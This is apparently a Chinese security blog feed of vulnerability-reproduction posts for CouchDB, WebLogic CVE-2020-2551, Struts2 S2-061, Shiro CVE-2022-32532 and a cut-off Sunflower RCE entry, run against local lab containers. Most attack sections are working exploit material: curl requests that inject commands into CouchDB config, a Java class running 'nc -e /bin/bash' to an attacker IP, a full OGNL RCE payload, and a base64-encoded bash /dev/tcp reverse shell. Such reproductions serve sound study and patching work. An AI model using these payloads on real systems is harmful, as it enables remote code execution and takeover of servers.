name,带上账号密码访问<code>/_membership</code>获取node名称：</p><p>其中GhostToKnow:GhostToKnow为管理员的账户密码</p><p><code>curl http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_membership</code></p><p>这里只有一个node，为：nonode@nohost</p><p>修改<code>nonode@nohost</code>的配置,其中<code>id &gt;/tmp/success</code>是要执行的命令，可以更换为弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27;</span><br></pre></td></tr></table></figure><p>请求添加一个名为ccc的Database，以便在里面执行查询</p><p><code>curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc&#39;</code></p><p>请求添加一个名为test的Document，以便在里面执行查询</p><p><code>curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/test&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</code></p><p>Couchdb 2.x删除了<code>_temp_view</code>，所以我们为了触发<code>query_servers</code>中定义的命令，需要添加一个<code>_view</code>：</p><p><code>curl -X PUT http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/_design/test -d  &#39;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39; -H &quot;Content-Type: application/json&quot;</code></p><p>增加<code>_view</code>的同时即触发了<code>query_servers</code>中的命令。</p><p>看到返回错误信息没有关系，报错来源于执行命令之后的流程</p><p>加入靶机的docker查看发现命令执行成功，成功写入success文件</p><p><img src="https://s2.loli.net/2023/04/02/aRHBhOo14mFNUJ7.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/aRHBhOo14mFNUJ7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230115195233436"></p><p><strong>1.6.0系列</strong></p><p><code>curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39;</code></p><p><code>curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc&#39;</code></p><p><code>curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/test&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</code></p><p><code>curl -X POST  &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc/_temp_view?limit=10&#39;  -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application/json&#39;</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>要替换对应的网址，端口，监听ip，对应版本，1.x和2.x的payload不一致。</p><p><code>python3 exp.py</code></p><p><img src="C:\Users\dong\Desktop\Books\CVE\发表过的\CVE-2017-12635,12636\CouchDB\image-20230115221117654.png" class="lazyload" data-srcset="C:\Users\dong\Desktop\Books\CVE\发表过的\CVE-2017-12635,12636\CouchDB\image-20230115221117654.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230115221117654"></p><p><img src="C:\Users\dong\Desktop\Books\CVE\发表过的\CVE-2017-12635,12636\CouchDB\image-20230115220615107.png" class="lazyload" data-srcset="C:\Users\dong\Desktop\Books\CVE\发表过的\CVE-2017-12635,12636\CouchDB\image-20230115220615107.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230115220615107"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CouchDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic CVE-2020-2551</title>
      <link href="/2023/04/02/Weblogic-CVE-2020-2551/"/>
      <url>/2023/04/02/Weblogic-CVE-2020-2551/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2020年1月15日,Oracle发布了一系列的安全补丁,其中Oracle WebLogic Server产品有高危漏洞,漏洞编号CVE-2020-2551,CVSS评分9.8分,漏洞利用难度低,可基于IIOP协议执行远程代码。</p><p>经过分析这次漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了,T3协议使用的是resolveClass方法去过滤的,resolveClass方法是会读取父类的,所以T3协议这样过滤是没问题的。但是IIOP协议这块,虽然也是使用的这个黑名单列表,但不是使用resolveClass方法去判断的,这样默认只会判断本类的类名,而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了,而JtaTransactionManager类是存在jndi注入的。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接使用vulhub中的CVE-2017-10271就可以</p><p>使用git克隆到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/02/D1wMBim29NJtYxX.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/D1wMBim29NJtYxX.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="图片"></p><p>进入对应环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/weblogic/CVE-2017-10271</span><br></pre></td></tr></table></figure><p>启动docker漏洞环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><p>搭建完成以后，访问7001&#x2F;console如下图所示即为搭建成功</p><p><img src="https://s2.loli.net/2023/04/02/G6FNYorIJEc8Kkt.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/G6FNYorIJEc8Kkt.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230107160549138"></p><h2 id="检测是否存在漏洞"><a href="#检测是否存在漏洞" class="headerlink" title="检测是否存在漏洞"></a>检测是否存在漏洞</h2><p><code>python3 CVE-2020-2551.py -u http://192.168.52.128:7001/</code></p><p><img src="https://s2.loli.net/2023/04/02/ibKoPA4lk8cURwV.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/ibKoPA4lk8cURwV.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230107164740702"></p><p>发现存在漏洞</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>攻击机ip：192.168.0.101</p><p>靶机ip：192.168.52.128</p><p>攻击机开启监听nc -lvnp 3333</p><p><img src="https://s2.loli.net/2023/04/02/Ai1cgxOJFXPUMvl.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/Ai1cgxOJFXPUMvl.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230107180523151"></p><p>编写一个exp.java文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">        <span class="keyword">static</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                        java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;nc -e /bin/bash 192.168.0.101 3333&quot;</span>&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中”nc -e &#x2F;bin&#x2F;bash 192.168.52.130 3333”是要执行的命令</p><p>然后进行编译，生成出一个exp.class文件</p><p><img src="https://s2.loli.net/2023/04/02/HwcJaQZLx4mzYsC.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/HwcJaQZLx4mzYsC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230107171912137"></p><p><img src="https://s2.loli.net/2023/04/02/CXRrEhn3piQOUgf.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/CXRrEhn3piQOUgf.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230107171939453"></p><p>启一个web服务，需要与exp.class在同一文件夹</p><p><img src="https://s2.loli.net/2023/04/02/MxjV8eORAw9hclC.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/MxjV8eORAw9hclC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230107172232631"></p><p>使用marshalsec起一个恶意的RMI服务</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.0.101/#exp&quot; 1099</code></p><p><img src="https://s2.loli.net/2023/04/02/wm1JhdTi5U6DapQ.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/wm1JhdTi5U6DapQ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230107180020082"></p><p>然后开始进行攻击，使用命令,成功弹出shell：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar weblogic_CVE_2020_2551.jar <span class="number">192.168</span><span class="number">.52</span><span class="number">.128</span> <span class="number">7001</span> rmi:<span class="comment">//192.168.0.101:1099/exp</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/02/g2QE1wkKCzTuB6J.png" class="lazyload" data-srcset="https://s2.loli.net/2023/04/02/g2QE1wkKCzTuB6J.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230107180754385"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现</title>
      <link href="/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/03/29/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-17530%EF%BC%89%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)，在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大，S2-061是对S2-059漏洞修复后的绕过。</p><p>影响版本：</p><p>Apache Struts 2.0.0 - 2.5.25</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里使用vulhub漏洞环境搭建</p><p>使用git克隆到本地</p><p><code>git clone https://github.com/vulhub/vulhub.git</code></p><p><img src="https://s2.loli.net/2023/03/29/pw6MsSl3Gh9OVFC.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/pw6MsSl3Gh9OVFC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152107512"></p><p>进入对应环境</p><p><code>cd vulhub/struts2/s2-061</code></p><p><img src="https://s2.loli.net/2023/03/29/qMJ1AjhwcPyZvCQ.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/qMJ1AjhwcPyZvCQ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152142885"></p><p>启动docker漏洞环境</p><p><code>sudo docker-compose up -d</code></p><p><img src="https://s2.loli.net/2023/03/29/FBkQSfqNDtjl4Rs.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/FBkQSfqNDtjl4Rs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210152205091"></p><p>访问对应地址，出现如下页面，环境搭建成功</p><p><img src="https://s2.loli.net/2023/03/29/gysCRZP8WVzSuLY.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/gysCRZP8WVzSuLY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210153856655"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>实现判断下是否存在漏洞，使用?id&#x3D;%25{7*7}查看返回id的值是7*7还是49，如果是47那么就说明进行了二次表达式解析，存在改漏洞</p><p><img src="https://s2.loli.net/2023/03/29/LlBdxGmzX7YfWiA.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/LlBdxGmzX7YfWiA.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210160031545"></p><p>这里id为49说明存在该漏洞。抓包修改为以下，这里的<code>#arglist.add(&quot;xx&quot;)</code>函数这里包含的值是你要执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /.action HTTP/1.1</span><br><span class="line">Host: 192.168.52.128:8080</span><br><span class="line">User-Agent: xxx</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=node0i3sptalo62q6kw46qu49oxwn1.node0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 833</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ls&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/29/4F8P7AkrgiKdXCc.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/4F8P7AkrgiKdXCc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210161714309"></p><p>已经可以执行我们的命令了，接下来反弹shell</p><p>在vps上监听3333端口：<code>nc -lvnp 3333</code></p><p>编写反弹shell代码</p><p><code>bash -i &gt;&amp; /dev/tcp/192.168.52.130/3333 0&gt;&amp;1</code></p><p>反弹shell涉及到管道符问题要将命令进行base64编码</p><p><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><p><img src="https://s2.loli.net/2023/03/29/VSOARQWsI8EBxTY.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/VSOARQWsI8EBxTY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210163917170"></p><p><img src="https://s2.loli.net/2023/03/29/gdhMeHEqvSIk4U9.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/gdhMeHEqvSIk4U9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210164523698"></p><p>成功反弹出shell</p><p>检查POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url</span>():</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;S2-061  CVE-2020-17530&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;target_url&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;The target address,example: http://192.168.52.128:8080&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">global</span> url</span><br><span class="line">url = args.target_url</span><br><span class="line"><span class="keyword">if</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">or</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;请使用http://或者https://&#x27;</span>)</span><br><span class="line">os._exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> url.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">url = url[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始测试&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> url</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>():</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100102 Firefox/107.0&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">vul_url = url + <span class="string">&#x27;/?id=%25&#123;7*7&#125;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">text = requests.get(vul_url,headers=headers,timeout=<span class="number">10</span>).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;49&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[漏洞存在]&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[漏洞不存在]&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[发生错误]&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">url()</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/29/Fxmt4Bah5ipH6Xw.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/Fxmt4Bah5ipH6Xw.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20221210170934924"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 Struts 2.5.26 版本或更高版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 身份认证绕过漏洞 CVE-2022-32532</title>
      <link href="/2023/03/29/Shiro-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2022-32532/"/>
      <url>/2023/03/29/Shiro-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2022-32532/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro 是一个强大且易用的 Java 安全框架，通过它可以执行身份验证、授权、密码和会话管理。使用 Shiro 的易用 API，您可以快速、轻松地保护任何应用程序 —— 从最小的移动应用程序到最大的 WEB 和企业应用程序。</span><br><span class="line"></span><br><span class="line">2022年6月29日，Apache官方披露Apache Shiro权限绕过漏洞(CVE-2022-32532)，当Apache Shiro中使用RegexRequestMatcher进行权限配置，且正则表达式中携带&quot;.&quot;时，未经授权的远程攻击者可通过构造恶意数据包绕过身份认证，导致配置的权限验证失效。</span><br></pre></td></tr></table></figure><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>Apache Shiro &lt; 1.9.1</code></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据java正则表达式的特点，在正则表达式中元字符.是匹配除换行符之外的任何单个字符。</span><br><span class="line">新增Pattern.DOTALL模式后，正则表达式.就可以匹配任何字符包括换行符。</span><br><span class="line">在shiro-core-1.9.0.jar中存在一个RegExPatternMatcher类，提供请求路径匹配功能及拦截器参数解析的功能。这个类的Pattern存在带.的正则表达式匹配，如果存在/n或/r字符时，就会判断错误。</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接使用vulfocus的镜像环境</p><p><img src="https://s2.loli.net/2023/03/29/gioCqn16KmD4H3y.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/gioCqn16KmD4H3y.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222160039366"></p><p>启动靶场后直接访问给的地址就行</p><p><img src="https://s2.loli.net/2023/03/29/jbewJR7il4oQKHL.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/jbewJR7il4oQKHL.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222160444747"></p><p><img src="https://s2.loli.net/2023/03/29/azknmPjTiDSbw9s.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/azknmPjTiDSbw9s.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222160450931"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>测试直接访问敏感地址访问被拒绝</p><p><img src="https://s2.loli.net/2023/03/29/CDAQPXOvMZkSsyb.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/CDAQPXOvMZkSsyb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222160528823"></p><p>我们抓一下get包，放在Repeater模块</p><h3 id="使用-0a进行权限绕过"><a href="#使用-0a进行权限绕过" class="headerlink" title="使用%0a进行权限绕过"></a>使用%0a进行权限绕过</h3><p>%0a是换行符</p><p><img src="https://s2.loli.net/2023/03/29/R5KJMGPhtxAIaCQ.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/R5KJMGPhtxAIaCQ.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230222161704254"></p><p>访问成功返回success</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>建议尽快升级至Apache Shiro 1.9.1及以上版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2022-10270/03672 向日葵RCE复现</title>
      <link href="/2023/03/29/CNVD-2022-10270-03672-%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/03/29/CNVD-2022-10270-03672-%E5%90%91%E6%97%A5%E8%91%B5RCE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>向日葵是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</p><p>于2022年2月5日和2022年2月15日，CNVD公开上海贝锐信息科技股份有限公司的向日葵远控软件存在远程代码执行漏洞（CNVD-2022-10270&#x2F;CNVD-2022-03672），影响Windows系统使用的个人版和简约版，攻击者可利用该漏洞获取服务器控制权。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">向日葵个人版   <span class="keyword">for</span> <span class="title class_">Windows</span> &lt;= <span class="number">11.0</span>.<span class="number">0.33</span></span><br><span class="line">向日葵简约版   &lt;= V1.<span class="number">0.1</span>.<span class="number">43315</span>（<span class="number">2021.12</span>）</span><br></pre></td></tr></table></figure><h3 id="漏洞级别"><a 